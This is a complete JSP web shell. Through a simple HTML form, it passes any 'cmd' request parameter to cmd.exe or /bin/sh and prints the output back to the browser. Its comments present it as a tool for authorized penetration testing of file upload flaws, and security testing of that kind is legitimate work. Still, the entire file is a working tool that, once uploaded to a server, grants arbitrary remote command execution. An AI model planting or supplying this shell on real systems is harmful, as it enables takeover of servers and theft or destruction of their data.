<%@ page import="java.util.*,java.io.*"%>
<%
// JSP Web Shell for testing file upload vulnerabilities
// This should only be used for authorized penetration testing

String cmd = request.getParameter("cmd");
if(cmd != null) {
    String[] commands;
    String os = System.getProperty("os.name").toLowerCase();
    if(os.contains("win")) {
        commands = new String[]{"cmd.exe", "/c", cmd};
    } else {
        commands = new String[]{"/bin/sh", "-c", cmd};
    }
    ProcessBuilder pb = new ProcessBuilder(commands);
    pb.redirectErrorStream(true);
    Process proc = pb.start();
    BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    String line;
    out.println("<pre>");
    while((line = br.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
    br.close();
}
%>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" autofocus>
<input type="submit" value="Execute">
</form>
</body>
</html>
